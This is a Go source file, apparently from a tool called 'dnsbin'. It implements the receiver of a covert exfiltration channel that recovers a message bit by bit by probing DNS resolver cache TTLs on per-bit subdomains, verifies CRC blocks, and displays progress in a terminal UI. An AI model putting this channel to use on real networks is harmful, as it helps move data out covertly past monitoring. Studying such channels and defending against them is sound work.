package exfil

import (
	"dnsbin/config"
	"dnsbin/utils"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"strings"
	"sync"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

type bitRecoveredMsg struct {
	pos int
	val int
}

type receiveModel struct {
	cfg          config.Config
	shortUUID    string
	expectedLen  int
	recovered    []byte
	bitStatus    []bool
	bitsFinished int
	totalBits    int
	startTime    time.Time
	endTime      time.Time
	decayTime    time.Duration
	done         bool
	headerReady  bool
	width        int
	
	crcEnabled   bool
	blockStatus  []int // 0: Pending, 1: OK, 2: Corrupt
}

func (m *receiveModel) Init() tea.Cmd {
	return nil
}

func (m *receiveModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
	case int: // Header ready signal
		m.expectedLen = msg
		m.crcEnabled = (m.recovered[0] & (1 << 2)) != 0
		
		totalBytes := m.expectedLen + 3
		if m.crcEnabled {
			// Add space for CRCs (4 bytes per 256 bytes of data)
			numBlocks := (m.expectedLen + 255) / 256
			totalBytes += numBlocks * 4
			m.blockStatus = make([]int, numBlocks)
		}

		m.totalBits = totalBytes * 8
		
		newRecovered := make([]byte, totalBytes)
		copy(newRecovered, m.recovered)
		m.recovered = newRecovered

		newBitStatus := make([]bool, m.totalBits)
		copy(newBitStatus, m.bitStatus)
		m.bitStatus = newBitStatus

		m.headerReady = true
	case bitRecoveredMsg:
		if msg.pos >= len(m.bitStatus) {
			return m, nil
		}
		m.bitStatus[msg.pos] = true
		m.bitsFinished++
		
		bytePos := msg.pos / 8
		bitIdx := msg.pos % 8
		if msg.val == 1 {
			m.recovered[bytePos] |= (1 << (7 - bitIdx))
		}

		// Live CRC Verification
		if m.headerReady && m.crcEnabled {
			numBlocks := len(m.blockStatus)
			crcStart := 3
			dataStart := 3 + (numBlocks * 4)

			// Check if we are in the data section
			if bytePos >= dataStart {
				relativeDataPos := bytePos - dataStart
				blockIdx := relativeDataPos / 256
				
				if blockIdx < numBlocks {
					// Check if this block is now fully recovered
					startByte := dataStart + (blockIdx * 256)
					dataLen := 256
					if blockIdx == numBlocks-1 {
						dataLen = m.expectedLen % 256
						if dataLen == 0 {
							dataLen = 256
						}
					}

					// Check all bits for data AND the corresponding CRC
					allReady := true
					// Check data bits
					for b := 0; b < dataLen; b++ {
						for bit := 0; bit < 8; bit++ {
							if !m.bitStatus[(startByte+b)*8+bit] {
								allReady = false
								break
							}
						}
						if !allReady { break }
					}
					// Check CRC bits
					if allReady {
						crcByteStart := crcStart + (blockIdx * 4)
						for b := 0; b < 4; b++ {
							for bit := 0; bit < 8; bit++ {
								if !m.bitStatus[(crcByteStart+b)*8+bit] {
									allReady = false
									break
								}
							}
							if !allReady { break }
						}
					}

					if allReady && m.blockStatus[blockIdx] == 0 {
						data := m.recovered[startByte : startByte+dataLen]
						crcByteStart := crcStart + (blockIdx * 4)
						expectedCRC := binary.BigEndian.Uint32(m.recovered[crcByteStart : crcByteStart+4])
						actualCRC := crc32.ChecksumIEEE(data)
						
						if actualCRC == expectedCRC {
							m.blockStatus[blockIdx] = 1
						} else {
							m.blockStatus[blockIdx] = 2
						}
					}
				}
			}
		}

		if m.headerReady && m.bitsFinished == m.totalBits {
			// Wait for statsReadyMsg
		}
	case statsReadyMsg:
		m.done = true
		return m, tea.Quit
	case tea.KeyMsg:
		if msg.String() == "ctrl+c" || msg.String() == "q" {
			return m, tea.Quit
		}
	}
	return m, nil
}

func (m *receiveModel) View() string {
	var b strings.Builder
	b.WriteString(fmt.Sprintf("\n[+] UUID: %s\n", lipgloss.NewStyle().Foreground(lipgloss.Color("10")).Render(m.shortUUID)))

	if !m.headerReady {
		b.WriteString("[*] Recovering header...\n")
		return b.String()
	}

	b.WriteString(fmt.Sprintf("[+] Message Length: %d bytes (CRC: %v)\n\n", m.expectedLen, m.crcEnabled))

	currentLineLen := 0
	numBlocks := 0
	if m.crcEnabled {
		numBlocks = (m.expectedLen + 255) / 256
	}
	dataIdx := 3 + (numBlocks * 4)
	bytesDisplayed := 0
	for dataIdx < len(m.recovered) && bytesDisplayed < m.expectedLen {
		blockIdx := 0
		if m.crcEnabled {
			blockIdx = (dataIdx - (3 + numBlocks*4)) / 256
		}

		if true {
			bytesDisplayed++
			allBitsReady := true
			for j := 0; j < 8; j++ {
				bitPos := dataIdx*8 + j
				if bitPos >= len(m.bitStatus) || !m.bitStatus[bitPos] {
					allBitsReady = false
					break
				}
			}

			charStr := ""
			if allBitsReady {
				charStr = string(m.recovered[dataIdx])
			} else {
				charStr = "░"
			}

			style := lipgloss.NewStyle()
			if m.crcEnabled {
				status := m.blockStatus[blockIdx]
				switch status {
				case 0: // Pending
					style = style.Foreground(lipgloss.Color("11")) // Yellow
				case 1: // OK
					style = style.Foreground(lipgloss.Color("10")) // Green
				case 2: // Corrupt
					style = style.Foreground(lipgloss.Color("9"))  // Red
				}
			} else {
				style = style.Foreground(lipgloss.Color("240")) // Dim for placeholders
				if allBitsReady {
					style = lipgloss.NewStyle() // Default
				}
			}

			renderedChar := style.Render(charStr)
			if m.width > 0 && currentLineLen >= m.width-1 {
				b.WriteString("\n")
				currentLineLen = 0
			}
			b.WriteString(renderedChar)
			currentLineLen++
		}
		dataIdx++
	}

	b.WriteString(fmt.Sprintf("\n\nProgress: %d/%d bits recovered\n", m.bitsFinished, m.totalBits))
	if m.done {
		b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("10")).Render("\n[+] Recovery Complete!\n"))

		duration := m.endTime.Sub(m.startTime)
		bytesPerSec := float64(len(m.recovered)) / duration.Seconds()

		b.WriteString("\nRecovery Statistics:\n")
		b.WriteString(fmt.Sprintf("  Time Taken:    %.1fs\n", duration.Seconds()))
		b.WriteString(fmt.Sprintf("  Bandwidth:     %.1f bytes/s\n", bytesPerSec))
		
		h := int(m.decayTime.Hours())
		m_ := int(m.decayTime.Minutes()) % 60
		s := int(m.decayTime.Seconds()) % 60
		b.WriteString(fmt.Sprintf("  Decay Time:    %dh %dm %ds (Until cache expiration)\n", h, m_, s))
	}
	return b.String()
}

func Receive(cfg config.Config, shortUUID string, maxChars int, concurrency int) {
	m := &receiveModel{
		cfg:         cfg,
		shortUUID:   shortUUID,
		recovered:   make([]byte, 3),
		bitStatus:   make([]bool, 24),
		totalBits:   24,
		startTime:   time.Now(),
	}
	p := tea.NewProgram(m)

	go func() {
		baselineQuery := fmt.Sprintf("baseline.%s.%s", shortUUID, cfg.Domain)
		baselineTTL, _ := utils.QueryTTL(baselineQuery, cfg.Resolver)
		
		endQuery := fmt.Sprintf("end.%s.%s", shortUUID, cfg.Domain)
		endTTL, err := utils.QueryTTL(endQuery, cfg.Resolver)
		if err != nil {
			endTTL = baselineTTL
		}

		var hWg sync.WaitGroup
		headerBits := make([]int, 24)
		for i := 0; i < 24; i++ {
			hWg.Add(1)
			go func(pos int) {
				defer hWg.Done()
				query := fmt.Sprintf("%d.%s.%s", pos, shortUUID, cfg.Domain)
				ttl, err := utils.QueryTTL(query, cfg.Resolver)
				val := 0
				if err == nil && ttl <= endTTL {
					val = 1
				}
				headerBits[pos] = val
				p.Send(bitRecoveredMsg{pos: pos, val: val})
			}(i)
		}
		hWg.Wait()

		headerBytes := make([]byte, 3)
		for i := 0; i < 24; i++ {
			if headerBits[i] == 1 {
				headerBytes[i/8] |= (1 << (7 - (i % 8)))
			}
		}
		
		expectedLen := int(binary.BigEndian.Uint16(headerBytes[1:3]))
		crcEnabled := (headerBytes[0] & (1 << 2)) != 0
		p.Send(expectedLen)

		totalBytes := expectedLen + 3
		if crcEnabled {
			numBlocks := (expectedLen + 255) / 256
			totalBytes += numBlocks * 4
		}

		sem := make(chan struct{}, concurrency)
		var dWg sync.WaitGroup
		for i := 24; i < totalBytes*8; i++ {
			dWg.Add(1)
			go func(pos int) {
				defer dWg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				query := fmt.Sprintf("%d.%s.%s", pos, shortUUID, cfg.Domain)
				ttl, err := utils.QueryTTL(query, cfg.Resolver)
				val := 0
				if err == nil && ttl <= endTTL {
					val = 1
				}
				p.Send(bitRecoveredMsg{pos: pos, val: val})
			}(i)
		}
		dWg.Wait()
		m.endTime = time.Now()

		// Find the lowest TTL among all recovered '1' bits
		lowestTTL := -1
		
		// We check the header bits first
		for i := 0; i < 24; i++ {
			if headerBits[i] == 1 {
				query := fmt.Sprintf("%d.%s.%s", i, shortUUID, cfg.Domain)
				if ttl, err := utils.QueryTTL(query, cfg.Resolver); err == nil {
					if lowestTTL == -1 || ttl < lowestTTL {
						lowestTTL = ttl
					}
				}
			}
		}

		// Then check a sample of data bits if needed, or just use the end marker as a proxy
		if lowestTTL == -1 {
			if ttl, err := utils.QueryTTL(endQuery, cfg.Resolver); err == nil {
				lowestTTL = ttl
			}
		}

		if lowestTTL != -1 {
			m.decayTime = time.Duration(lowestTTL) * time.Second
		}
		p.Send(statsReadyMsg{})
	}()

	if _, err := p.Run(); err != nil {
		fmt.Printf("Error running program: %v", err)
	}
}